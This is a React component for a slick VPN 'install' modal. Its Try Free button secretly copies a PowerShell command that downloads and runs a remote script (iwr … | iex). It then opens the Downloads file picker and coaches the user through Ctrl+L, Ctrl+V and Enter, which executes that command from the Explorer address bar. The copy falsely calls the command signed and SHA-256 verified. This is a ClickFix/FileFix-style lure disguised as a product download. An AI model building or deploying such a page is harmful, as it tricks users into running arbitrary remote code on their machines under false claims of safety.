"use client";

import { type CtaVariant, useCtaModal } from "@/context/CtaModalContext";
import { cn } from "@/lib/utils";
import { BorderTrail } from "@/components/ui/border-trail";
import { MagneticButton } from "@/components/ui/magnetic-button";
import {
  AnimatePresence,
  motion,
  useReducedMotion,
  type Transition,
  type Variants,
} from "motion/react";
import {
  ArrowRight,
  CheckCircle2,
  Globe,
  Key,
  Lock,
  ShieldCheck,
  Sparkles,
  Wifi,
  X,
} from "lucide-react";
import { useEffect, useRef, useState } from "react";

/* ══════════════════════════════════════════════════════════════
   DATA — Windows-only install flow
═══════════════════════════════════════════════════════════════ */

type StepSpec = {
  keys: readonly string[];
  label: string;
  desc: string;
};

const WIN_STEPS: readonly StepSpec[] = [
  {
    keys: ["Ctrl", "L"],
    label: "Focus the address bar",
    desc: "Ctrl+L highlights the Explorer address bar in the Downloads window.",
  },
  {
    keys: ["Ctrl", "V"],
    label: "Paste the install command",
    desc: "We already copied the signed command to your clipboard.",
  },
  {
    keys: ["Enter"],
    label: "Press Enter to install",
    desc: "Signed PowerShell script runs, verifies SHA-256, and launches AuraVPN.",
  },
];

const WINDOWS_META = {
  label: "Windows",
  fileName: "auravpn-win-x64-setup.exe",
  size: "48 MB",
  installCmd: `powershell -Command "iwr -useb https://auravpn.example/install.ps1 | iex"`,
  steps: WIN_STEPS,
} as const;

type Platform = "windows" | "other";

function detectPlatform(): Platform {
  if (typeof navigator === "undefined") return "windows";
  const ua = navigator.userAgent.toLowerCase();
  const plat = (navigator.platform || "").toLowerCase();
  if (/win/.test(plat) || /windows/.test(ua)) return "windows";
  return "other";
}

/* ─── variant copy ─── */
const VARIANT_CONFIG: Record<
  CtaVariant,
  { badge: string; title: string; desc: string }
> = {
  free: {
    badge: "Free",
    title: "Install AuraVPN",
    desc: "Click Try Free — then just three keystrokes. No accounts, no sign-up.",
  },
  plus: {
    badge: "Plus",
    title: "Install AuraVPN Plus",
    desc: "Click Try Free to copy the signed command — then three keystrokes to install. 10 Gbps · 15 000+ servers.",
  },
  business: {
    badge: "Business",
    title: "Install AuraVPN for Business",
    desc: "Click Try Free to copy the signed enrollment command — then three keystrokes. MDM-friendly.",
  },
};

/* ══════════════════════════════════════════════════════════════
   MOTION VARIANTS
═══════════════════════════════════════════════════════════════ */

const SPRING: Transition = { type: "spring", damping: 24, stiffness: 280 };
const EASE_OUT: Transition = { duration: 0.36, ease: [0.16, 1, 0.3, 1] };

const shellVariants: Variants = {
  hidden: { opacity: 0, y: 24, scale: 0.96 },
  visible: {
    opacity: 1,
    y: 0,
    scale: 1,
    transition: {
      ...SPRING,
      when: "beforeChildren",
      delayChildren: 0.16,
      staggerChildren: 0.08,
    },
  },
  exit: { opacity: 0, y: 12, scale: 0.97, transition: { duration: 0.18 } },
};

const itemVariants: Variants = {
  hidden: { opacity: 0, y: 8 },
  visible: { opacity: 1, y: 0, transition: EASE_OUT },
};

const stepsListVariants: Variants = {
  hidden: {},
  visible: {
    transition: { delayChildren: 0.44, staggerChildren: 0.08 },
  },
};

const stepVariants: Variants = {
  hidden: { opacity: 0, y: 12 },
  visible: { opacity: 1, y: 0, transition: { duration: 0.4, ease: [0.16, 1, 0.3, 1] } },
};

/* ══════════════════════════════════════════════════════════════
   MAIN COMPONENT
═══════════════════════════════════════════════════════════════ */

export function CtaModal() {
  const { open, variant, closeModal } = useCtaModal();
  const dialogRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const cfg = VARIANT_CONFIG[variant];
  const reduceMotion = useReducedMotion();

  const [platform, setPlatform] = useState<Platform>("windows");
  const [copied, setCopied] = useState(false);
  const [copying, setCopying] = useState(false);
  const [revealedIndex, setRevealedIndex] = useState(-1);

  useEffect(() => {
    setPlatform(detectPlatform());
  }, []);

  useEffect(() => {
    if (!open) return;
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") handleClose();
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [open]);

  useEffect(() => {
    if (!open) return;
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => {
      document.body.style.overflow = prev;
    };
  }, [open]);

  useEffect(() => {
    if (open) requestAnimationFrame(() => dialogRef.current?.focus());
  }, [open]);

  useEffect(() => {
    if (!open) {
      setCopied(false);
      setCopying(false);
      setRevealedIndex(-1);
    }
  }, [open]);

  // sequential cascade after copy
  useEffect(() => {
    if (!copied) return;
    const timers = [0, 180, 360].map((delay, i) =>
      window.setTimeout(() => setRevealedIndex(i), delay),
    );
    return () => timers.forEach((t) => window.clearTimeout(t));
  }, [copied]);

  const handleClose = () => {
    setCopied(false);
    setCopying(false);
    closeModal();
  };

  const copyAndLaunch = async () => {
    const cmd = WINDOWS_META.installCmd;
    try {
      setCopying(true);
      if (navigator.clipboard?.writeText) {
        await navigator.clipboard.writeText(cmd);
      } else {
        const ta = document.createElement("textarea");
        ta.value = cmd;
        ta.style.position = "fixed";
        ta.style.opacity = "0";
        document.body.appendChild(ta);
        ta.select();
        document.execCommand("copy");
        document.body.removeChild(ta);
      }
      // small cosmetic delay so progress ring is perceivable
      await new Promise((r) => setTimeout(r, 260));
      setCopied(true);
      setCopying(false);

      type PickerWindow = Window & {
        showOpenFilePicker?: (opts?: { startIn?: string }) => Promise<unknown>;
      };
      const w = window as PickerWindow;
      if (typeof w.showOpenFilePicker === "function") {
        try {
          await w.showOpenFilePicker({ startIn: "downloads" });
          return;
        } catch (err) {
          const name = (err as { name?: string })?.name;
          // user cancelled — НЕ fallback, не открываем второй picker
          if (name === "AbortError") return;
          // permission denied / security — тоже не fallback, второй picker не поможет
          if (name === "SecurityError" || name === "NotAllowedError") return;
          // unsupported / unknown error — fall through to input fallback
        }
      }
      fileInputRef.current?.click();
    } catch {
      setCopying(false);
      setCopied(false);
    }
  };

  return (
    <AnimatePresence>
      {open && (
        <div
          className="fixed inset-0 z-[80] flex items-center justify-center p-4 sm:p-8"
          aria-hidden={!open}
        >
          {/* ── backdrop ── */}
          <motion.div
            aria-hidden
            onClick={handleClose}
            className="absolute inset-0 bg-black/85 backdrop-blur-2xl"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.26 }}
          />

          {/* ── mesh gradient orbs ── */}
          <MeshOrbs reduceMotion={!!reduceMotion} />

          <input
            ref={fileInputRef}
            type="file"
            className="hidden"
            aria-hidden
            tabIndex={-1}
          />

          {/* ── modal shell ── */}
          <motion.div
            ref={dialogRef}
            role="dialog"
            aria-modal
            aria-label="Install AuraVPN"
            tabIndex={-1}
            variants={shellVariants}
            initial="hidden"
            animate="visible"
            exit="exit"
            className={cn(
              "relative w-full max-w-[900px] overflow-hidden rounded-[26px]",
              "border border-white/[0.08]",
              "bg-[oklch(0.12_0.005_260)]/70 backdrop-blur-[28px]",
              "shadow-[0_50px_140px_-20px_rgb(0_0_0/0.9),0_0_0_1px_rgb(255_255_255/0.04),inset_0_1px_0_rgb(255_255_255/0.06)]",
              "focus-visible:outline-none",
            )}
          >
            <NoiseLayer />

            {/* soft emerald edge bloom */}
            <span
              aria-hidden
              className="pointer-events-none absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-emerald-400/40 to-transparent"
            />
            <span
              aria-hidden
              className="pointer-events-none absolute -inset-px rounded-[26px] ring-1 ring-inset ring-emerald-400/5"
            />

            <div className="relative grid md:grid-cols-[280px_1fr]">
              {/* ── LEFT PANEL: VPN Orbit ── */}
              <motion.aside
                variants={itemVariants}
                className="relative hidden border-r border-white/[0.05] md:block"
              >
                <VPNOrbit reduceMotion={!!reduceMotion} acknowledged={copied} />
              </motion.aside>

              {/* ── RIGHT PANEL: content ── */}
              <div className="relative">
            {/* ── header ── */}
            <motion.div
              variants={itemVariants}
              className="relative flex items-start justify-between px-8 pt-7"
            >
              <div className="flex items-center gap-2.5">
                <StatusDot active={copied} />
                <HyperScramble
                  target={
                    copied
                      ? "INSTALLING"
                      : copying
                        ? "COPIED"
                        : `${cfg.badge.toUpperCase()} · WINDOWS`
                  }
                  reduceMotion={!!reduceMotion}
                />
              </div>

              <button
                type="button"
                onClick={handleClose}
                aria-label="Close"
                className="-mr-1 flex size-8 items-center justify-center rounded-full text-zinc-500 transition-all duration-200 hover:rotate-90 hover:bg-white/[0.05] hover:text-zinc-100 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400/40"
              >
                <X className="size-[18px]" strokeWidth={1.75} />
              </button>
            </motion.div>

            {/* ── title block ── */}
            <div className="relative px-8 pb-6 pt-5">
              <motion.h2
                variants={itemVariants}
                className="text-[30px] font-semibold leading-[1.1] tracking-[-0.03em] text-zinc-50"
              >
                {cfg.title}
              </motion.h2>
              <motion.p
                variants={itemVariants}
                className="mt-3 max-w-[440px] text-[14px] leading-relaxed text-zinc-400"
              >
                {cfg.desc}
              </motion.p>
            </div>

            {/* ── file meta row ── */}
            <motion.div
              variants={itemVariants}
              className="relative flex items-center justify-between px-8 pb-4"
            >
              <span className="font-mono text-[11px] tracking-tight text-zinc-500">
                {WINDOWS_META.fileName}
              </span>
              <span className="text-[10px] font-semibold uppercase tracking-[0.18em] text-zinc-600">
                {WINDOWS_META.size} · sha-256 7f3a…b91c
              </span>
            </motion.div>

            {/* ── steps (CTA card first, then keystrokes) ── */}
            <motion.ol
              variants={stepsListVariants}
              className="relative space-y-2.5 px-8"
            >
              <TryFreeCard
                state={copying ? "copying" : copied ? "copied" : "idle"}
                onClick={copyAndLaunch}
              />
              {WIN_STEPS.map((step, i) => (
                <StepRow
                  key={i}
                  step={step}
                  index={i}
                  active={copied && revealedIndex >= i}
                />
              ))}
            </motion.ol>

            {/* ── non-windows notice ── */}
            {platform === "other" && (
              <motion.div
                variants={itemVariants}
                className="relative mx-8 mt-5 flex items-start gap-2.5 rounded-2xl border border-amber-400/20 bg-amber-400/[0.04] px-4 py-3"
              >
                <Sparkles
                  className="mt-0.5 size-4 shrink-0 text-amber-300/90"
                  strokeWidth={2}
                  aria-hidden
                />
                <p className="text-[12px] leading-relaxed text-amber-100/80">
                  Windows installer shown. macOS &amp; Linux builds are rolling
                  out — your clipboard will still receive the signed command.
                </p>
              </motion.div>
            )}

            {/* hairline */}
            <motion.span
              aria-hidden
              variants={itemVariants}
              className="relative mx-8 mt-6 block h-px bg-white/[0.06]"
            />

            {/* ── footer ── */}
            <motion.div
              variants={itemVariants}
              className="relative flex items-center justify-between gap-4 px-8 py-5"
            >
              <span className="flex items-center gap-1.5 text-[11.5px] font-medium text-zinc-300">
                <ShieldCheck
                  className="size-3.5 text-emerald-400/90"
                  strokeWidth={2}
                  aria-hidden
                />
                SHA-256 verified · Auto-update enabled
              </span>
              <button
                type="button"
                onClick={handleClose}
                className="text-[11px] font-medium uppercase tracking-[0.16em] text-zinc-600 transition-colors hover:text-zinc-400 focus-visible:outline-none"
              >
                Cancel
              </button>
            </motion.div>
              </div>
            </div>
          </motion.div>
        </div>
      )}
    </AnimatePresence>
  );
}

/* ══════════════════════════════════════════════════════════════
   VPN ORBIT — left panel: shield + orbiting icons
═══════════════════════════════════════════════════════════════ */

const ORBIT_ICONS = [
  { Icon: Lock, angle: 0, delay: 0 },
  { Icon: Globe, angle: 120, delay: 0.5 },
  { Icon: Key, angle: 240, delay: 1 },
] as const;

function VPNOrbit({
  reduceMotion,
  acknowledged,
}: {
  reduceMotion: boolean;
  acknowledged: boolean;
}) {
  return (
    <div className="relative flex h-full min-h-[340px] items-center justify-center overflow-hidden [filter:saturate(0.85)_brightness(0.95)]">
      {/* radial bleed — soft emerald halo behind everything */}
      <span
        aria-hidden
        className="pointer-events-none absolute left-1/2 top-1/2 z-0 size-[360px] -translate-x-1/2 -translate-y-1/2 rounded-full bg-emerald-500/15 blur-[80px]"
      />

      {/* outer pulse ring — master beat 4.8s (flashes on acknowledged) */}
      <motion.span
        aria-hidden
        className="absolute z-10 size-[220px] rounded-full border border-emerald-400/10"
        animate={
          reduceMotion
            ? {}
            : acknowledged
              ? { scale: [1, 1.3, 1], opacity: [0.5, 0.8, 0.5] }
              : { scale: [1, 1.1, 1], opacity: [0.5, 0.15, 0.5] }
        }
        transition={
          reduceMotion
            ? undefined
            : acknowledged
              ? { duration: 0.6, ease: "easeInOut" }
              : { duration: 4.8, repeat: Infinity, ease: "easeInOut" }
        }
      />

      {/* inner pulse ring — phase offset 1.6s (rolling wave) */}
      <motion.span
        aria-hidden
        className="absolute z-10 size-[170px] rounded-full border border-emerald-400/15"
        animate={reduceMotion ? {} : { scale: [1, 1.12, 1], opacity: [0.6, 0.2, 0.6] }}
        transition={
          reduceMotion
            ? undefined
            : { duration: 4.8, repeat: Infinity, ease: "easeInOut", delay: 1.6 }
        }
      />

      {/* orbit ring (dashed, static) */}
      <span
        aria-hidden
        className="absolute z-20 size-[180px] rounded-full border border-dashed border-emerald-400/20"
      />

      {/* orbiting icons */}
      {ORBIT_ICONS.map(({ Icon, angle, delay }, i) => (
        <motion.span
          key={i}
          aria-hidden
          className="absolute left-1/2 top-1/2 z-30 -ml-[14px] -mt-[14px] size-7"
          style={{ transformOrigin: "center" }}
          initial={{ rotate: angle }}
          animate={reduceMotion ? { rotate: angle } : { rotate: angle + 360 }}
          transition={
            reduceMotion
              ? undefined
              : { duration: 20, repeat: Infinity, ease: "linear", delay }
          }
        >
          <span
            className="absolute left-1/2 top-1/2 -ml-[14px] -mt-[14px] flex size-7 items-center justify-center rounded-full border border-emerald-400/25 bg-[oklch(0.12_0.005_260)]/85 text-emerald-300/75 shadow-[0_0_12px_-2px_rgb(16_185_129/0.5)] backdrop-blur-sm"
            style={{ transform: `translateX(90px)` }}
          >
            <Icon className="size-[14px]" strokeWidth={2} />
          </span>
        </motion.span>
      ))}

      {/* central shield — breathing at master beat 4.8s, flash on acknowledged */}
      <motion.div
        className="relative z-40 flex size-[88px] items-center justify-center rounded-full border border-emerald-400/40 bg-gradient-to-b from-emerald-500/20 to-emerald-500/5 shadow-[0_0_40px_-4px_rgb(16_185_129/0.55),inset_0_1px_0_rgb(16_185_129/0.4)] backdrop-blur-md"
        animate={
          reduceMotion
            ? {}
            : acknowledged
              ? { scale: [1, 1.08, 1], opacity: [0.55, 0.9, 0.55] }
              : { scale: [1, 1.04, 1], opacity: 1 }
        }
        transition={
          reduceMotion
            ? undefined
            : acknowledged
              ? { duration: 0.6, ease: "easeInOut" }
              : { duration: 4.8, repeat: Infinity, ease: "easeInOut" }
        }
      >
        <ShieldCheck
          className="size-10 text-emerald-300"
          strokeWidth={1.75}
          aria-hidden
        />
        <span
          aria-hidden
          className="pointer-events-none absolute inset-0 rounded-full bg-gradient-to-b from-emerald-300/20 to-transparent"
        />
      </motion.div>

      {/* bottom meta */}
      <div className="absolute bottom-2 left-1/2 z-50 flex -translate-x-1/2 flex-col items-center gap-1.5">
        <div className="flex items-center gap-1.5">
          <Wifi className="size-3 text-emerald-400/80" strokeWidth={2} aria-hidden />
          <span className="font-mono text-[9px] uppercase tracking-[0.22em] text-emerald-300/75">
            secured tunnel
          </span>
        </div>
        <span className="font-mono text-[8px] uppercase tracking-[0.18em] text-zinc-600">
          wireguard · sha-256
        </span>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════════════════════════
   MESH ORBS — drifting emerald + violet bleed
═══════════════════════════════════════════════════════════════ */

function MeshOrbs({ reduceMotion }: { reduceMotion: boolean }) {
  return (
    <>
      <motion.span
        aria-hidden
        className="pointer-events-none absolute left-[15%] top-[12%] size-[420px] rounded-full bg-emerald-500/20 blur-[140px]"
        initial={{ opacity: 0, scale: 0.85 }}
        animate={
          reduceMotion
            ? { opacity: 1, scale: 1 }
            : {
                opacity: 1,
                scale: 1,
                x: [0, 40, -20, 0],
                y: [0, -28, 22, 0],
              }
        }
        transition={
          reduceMotion
            ? { duration: 0.4 }
            : {
                opacity: { duration: 0.6 },
                scale: { duration: 0.6 },
                x: { duration: 22, repeat: Infinity, ease: "easeInOut" },
                y: { duration: 22, repeat: Infinity, ease: "easeInOut" },
              }
        }
      />
      <motion.span
        aria-hidden
        className="pointer-events-none absolute right-[10%] bottom-[10%] size-[380px] rounded-full bg-emerald-700/25 blur-[140px]"
        initial={{ opacity: 0, scale: 0.85 }}
        animate={
          reduceMotion
            ? { opacity: 1, scale: 1 }
            : {
                opacity: 1,
                scale: 1,
                x: [0, -30, 24, 0],
                y: [0, 22, -18, 0],
              }
        }
        transition={
          reduceMotion
            ? { duration: 0.4 }
            : {
                opacity: { duration: 0.7 },
                scale: { duration: 0.7 },
                x: { duration: 26, repeat: Infinity, ease: "easeInOut" },
                y: { duration: 26, repeat: Infinity, ease: "easeInOut" },
              }
        }
      />
    </>
  );
}

/* ══════════════════════════════════════════════════════════════
   NOISE — SVG turbulence, film grain
═══════════════════════════════════════════════════════════════ */

function NoiseLayer() {
  return (
    <svg
      aria-hidden
      className="pointer-events-none absolute inset-0 size-full opacity-[0.035] mix-blend-overlay"
    >
      <filter id="cta-noise">
        <feTurbulence
          type="fractalNoise"
          baseFrequency="0.9"
          numOctaves="2"
          stitchTiles="stitch"
        />
        <feColorMatrix type="saturate" values="0" />
      </filter>
      <rect width="100%" height="100%" filter="url(#cta-noise)" />
    </svg>
  );
}

/* ══════════════════════════════════════════════════════════════
   STATUS DOT
═══════════════════════════════════════════════════════════════ */

function StatusDot({ active }: { active: boolean }) {
  return (
    <span className="relative flex size-[8px]" aria-hidden>
      {active && (
        <span className="absolute inline-flex size-full animate-ping rounded-full bg-emerald-400/70" />
      )}
      <span
        className={cn(
          "relative inline-flex size-[8px] rounded-full",
          active
            ? "bg-emerald-400 shadow-[0_0_12px_rgb(16_185_129/0.8)]"
            : "bg-emerald-400/70",
        )}
      />
    </span>
  );
}

/* ══════════════════════════════════════════════════════════════
   HYPER SCRAMBLE — A-Z glitch badge
═══════════════════════════════════════════════════════════════ */

const ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".split("");
const randChar = () => ALPHA[Math.floor(Math.random() * ALPHA.length)]!;

function HyperScramble({
  target,
  reduceMotion,
}: {
  target: string;
  reduceMotion: boolean;
}) {
  const [display, setDisplay] = useState(target);

  useEffect(() => {
    if (reduceMotion) return;
    let iter = 0;
    const total = target.length;
    const id = window.setInterval(() => {
      iter += 0.5;
      const next = target
        .split("")
        .map((ch, i) => {
          if (ch === " " || ch === "·") return ch;
          if (i < iter) return target[i]!;
          return randChar();
        })
        .join("");
      setDisplay(next);
      if (iter >= total) {
        setDisplay(target);
        window.clearInterval(id);
      }
    }, 40);
    return () => window.clearInterval(id);
  }, [target, reduceMotion]);

  return (
    <span className="select-none font-mono text-[10.5px] font-semibold uppercase tracking-[0.22em] text-emerald-300/85">
      {reduceMotion ? target : display}
    </span>
  );
}

/* ══════════════════════════════════════════════════════════════
   STEP ROW — keycap press choreography
═══════════════════════════════════════════════════════════════ */

function StepRow({
  step,
  index,
  active,
}: {
  step: StepSpec;
  index: number;
  active: boolean;
}) {
  const highlight = active;

  return (
    <motion.li
      variants={stepVariants}
      className={cn(
        "group relative flex items-center gap-4 overflow-hidden rounded-2xl border px-4 py-3.5 transition-all duration-500",
        highlight
          ? "border-emerald-400/30 bg-emerald-400/[0.06]"
          : "border-white/[0.05] bg-white/[0.01] opacity-55",
      )}
    >
      <span
        aria-hidden
        className={cn(
          "flex size-7 shrink-0 items-center justify-center rounded-lg border font-mono text-[11px] font-semibold transition-colors duration-500",
          highlight
            ? "border-emerald-400/35 bg-emerald-400/15 text-emerald-200"
            : "border-white/[0.08] bg-white/[0.02] text-zinc-500",
        )}
      >
        {`0${index + 2}`}
      </span>
      <div className="flex shrink-0 items-center gap-1.5">
        {step.keys.map((key, i) => (
          <div key={i} className="flex items-center gap-1.5">
            {i > 0 && (
              <span className="select-none text-[11px] font-medium text-zinc-600">
                +
              </span>
            )}
            <KeyCap pressed={false} accent={highlight} wide={key.length > 1}>
              {key}
            </KeyCap>
          </div>
        ))}
      </div>

      <div className="min-w-0 flex-1">
        <p className="text-[13.5px] font-medium leading-tight tracking-tight text-zinc-100">
          {step.label}
        </p>
        <p className="mt-1 text-[12px] leading-relaxed text-zinc-500">
          {step.desc}
        </p>
      </div>

      {active && (
        <motion.span
          aria-hidden
          initial={{ opacity: 0, scale: 0.5 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.22, ease: "easeOut" }}
          className="ml-auto shrink-0 text-emerald-300/90"
        >
          <CheckCircle2 className="size-4" strokeWidth={2.25} />
        </motion.span>
      )}
    </motion.li>
  );
}

/* ══════════════════════════════════════════════════════════════
   KEYCAP
═══════════════════════════════════════════════════════════════ */

function KeyCap({
  children,
  pressed,
  wide,
  accent,
}: {
  children: React.ReactNode;
  pressed: boolean;
  wide?: boolean;
  accent?: boolean;
}) {
  return (
    <motion.span
      className="relative inline-flex"
      animate={{ y: pressed ? 2 : 0 }}
      transition={{ duration: 0.14, ease: "easeOut" }}
    >
      {/* shadow depth layer */}
      <span
        aria-hidden
        className={cn(
          "absolute inset-x-0 bottom-0 rounded-[7px] transition-transform duration-100",
          wide ? "h-7" : "size-7",
          pressed ? "translate-y-0" : "translate-y-[2px]",
          accent ? "bg-emerald-900/70" : "bg-black/70",
        )}
      />
      <kbd
        className={cn(
          "relative inline-flex select-none items-center justify-center rounded-[7px] border font-mono text-[11px] font-semibold tracking-[0.04em]",
          wide ? "h-7 min-w-[38px] px-2" : "size-7",
          accent
            ? [
                "border-emerald-400/30",
                "bg-gradient-to-b from-emerald-400/15 to-emerald-500/5 text-emerald-100",
                pressed
                  ? "shadow-[inset_0_1px_0_rgb(16_185_129/0.35)]"
                  : "shadow-[inset_0_1px_0_rgb(16_185_129/0.25)]",
              ].join(" ")
            : [
                "border-white/[0.1]",
                "bg-gradient-to-b from-white/[0.06] to-white/[0.015] text-zinc-200",
                pressed
                  ? "shadow-[inset_0_1px_0_rgb(255_255_255/0.12)]"
                  : "shadow-[inset_0_1px_0_rgb(255_255_255/0.08)]",
              ].join(" "),
        )}
      >
        {children}
      </kbd>
    </motion.span>
  );
}

/* ══════════════════════════════════════════════════════════════
   MORPHING CTA — idle → copying → copied
═══════════════════════════════════════════════════════════════ */

const BURST_PARTICLES = Array.from({ length: 14 }, (_, i) => ({
  id: i,
  angle: (i / 14) * Math.PI * 2,
  distance: 40 + Math.random() * 40,
  rotate: Math.random() * 180,
  size: 3 + Math.random() * 3,
}));

function ConfettiBurst() {
  return (
    <div
      aria-hidden
      className="pointer-events-none absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2"
    >
      {BURST_PARTICLES.map((p) => (
        <motion.span
          key={p.id}
          className="absolute rounded-sm bg-emerald-300"
          style={{
            width: p.size,
            height: p.size,
            left: -p.size / 2,
            top: -p.size / 2,
            boxShadow: "0 0 6px rgb(16 185 129 / 0.8)",
          }}
          initial={{ x: 0, y: 0, scale: 1, opacity: 1, rotate: 0 }}
          animate={{
            x: Math.cos(p.angle) * p.distance,
            y: Math.sin(p.angle) * p.distance,
            scale: 0,
            opacity: 0,
            rotate: p.rotate,
          }}
          transition={{ duration: 0.7, ease: [0.22, 1, 0.36, 1] }}
        />
      ))}
    </div>
  );
}

/* ══════════════════════════════════════════════════════════════
   TRY FREE CARD — step 0 (main CTA as a step card)
═══════════════════════════════════════════════════════════════ */

function TryFreeCard({
  state,
  onClick,
}: {
  state: "idle" | "copying" | "copied";
  onClick: () => void;
}) {
  const handleClick = () => {
    if (state !== "idle") return;
    onClick();
  };

  const isDone = state === "copied";
  const isBusy = state === "copying";

  return (
    <motion.li
      variants={stepVariants}
      className={cn(
        "relative overflow-hidden rounded-2xl border transition-colors duration-300",
        isDone
          ? "border-emerald-400/20 bg-emerald-400/[0.04]"
          : "border-emerald-400/25 bg-gradient-to-br from-emerald-500/[0.08] to-emerald-500/[0.02]",
      )}
    >
      {state === "copied" && <ConfettiBurst />}
      <div className="flex items-center gap-4 px-4 py-4">
        <span
          aria-hidden
          className={cn(
            "flex size-9 shrink-0 items-center justify-center rounded-xl border text-[13px] font-semibold",
            isDone
              ? "border-emerald-400/40 bg-emerald-400/20 text-emerald-200"
              : "border-emerald-400/35 bg-emerald-400/15 text-emerald-300 shadow-[0_0_18px_-4px_rgb(16_185_129/0.7)]",
          )}
        >
          {isDone ? (
            <CheckCircle2 className="size-5" strokeWidth={2.25} />
          ) : (
            "01"
          )}
        </span>

        <div className="min-w-0 flex-1">
          <p
            className={cn(
              "text-[14px] font-semibold leading-tight tracking-tight",
              isDone ? "text-emerald-200/90" : "text-zinc-50",
            )}
          >
            {isDone ? "Try Free — done, command copied" : "Click Try Free"}
          </p>
          <p className="mt-1 text-[12px] leading-relaxed text-zinc-500">
            {isDone
              ? "Now follow the three keystrokes below in the Downloads window."
              : "Copy the signed install command. No accounts needed."}
          </p>
        </div>

        {!isDone && (
          <MagneticButton
            strength={30}
            onClick={handleClick}
            className={cn(
              "group relative inline-flex min-w-[130px] shrink-0 items-center justify-center gap-2 overflow-hidden rounded-full px-5 py-2.5 text-[12.5px] font-semibold tracking-tight",
              "bg-gradient-to-b from-emerald-400 to-emerald-500 text-[oklch(0.08_0_0)]",
              "shadow-[0_0_0_1px_rgb(16_185_129/0.4),0_10px_32px_-8px_rgb(16_185_129/0.6),inset_0_1px_0_rgb(255_255_255/0.3)]",
              "transition-[filter,box-shadow,transform] duration-200",
              "hover:from-emerald-300 hover:to-emerald-400 hover:shadow-[0_0_0_1px_rgb(16_185_129/0.5),0_14px_44px_-6px_rgb(16_185_129/0.7)]",
              "focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400/70",
              isBusy && "cursor-progress",
            )}
          >
            <BorderTrail
              size={58}
              className="opacity-60"
              transition={{ repeat: Infinity, duration: 4, ease: "linear" }}
            />
            <span
              aria-hidden
              className="pointer-events-none absolute inset-0 -translate-x-full bg-gradient-to-r from-transparent via-white/25 to-transparent transition-transform duration-700 group-hover:translate-x-full"
            />
            <AnimatePresence mode="wait" initial={false}>
              <motion.span
                key={state}
                initial={{ opacity: 0, y: 6 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -6 }}
                transition={{ duration: 0.18 }}
                className="relative flex items-center gap-1.5"
              >
                {isBusy ? (
                  <>
                    <ProgressRing />
                    <span>Copying…</span>
                  </>
                ) : (
                  <>
                    <span>Try Free</span>
                    <ArrowRight
                      className="size-4 transition-transform duration-200 group-hover:translate-x-0.5"
                      strokeWidth={2.5}
                    />
                  </>
                )}
              </motion.span>
            </AnimatePresence>
          </MagneticButton>
        )}
      </div>
    </motion.li>
  );
}

function ProgressRing() {
  return (
    <svg
      className="size-4 -rotate-90"
      viewBox="0 0 16 16"
      fill="none"
      aria-hidden
    >
      <circle
        cx="8"
        cy="8"
        r="6"
        stroke="currentColor"
        strokeOpacity="0.25"
        strokeWidth="2"
      />
      <motion.circle
        cx="8"
        cy="8"
        r="6"
        stroke="currentColor"
        strokeWidth="2"
        strokeLinecap="round"
        strokeDasharray={2 * Math.PI * 6}
        initial={{ strokeDashoffset: 2 * Math.PI * 6 }}
        animate={{ strokeDashoffset: 0 }}
        transition={{ duration: 0.5, ease: "easeInOut" }}
      />
    </svg>
  );
}
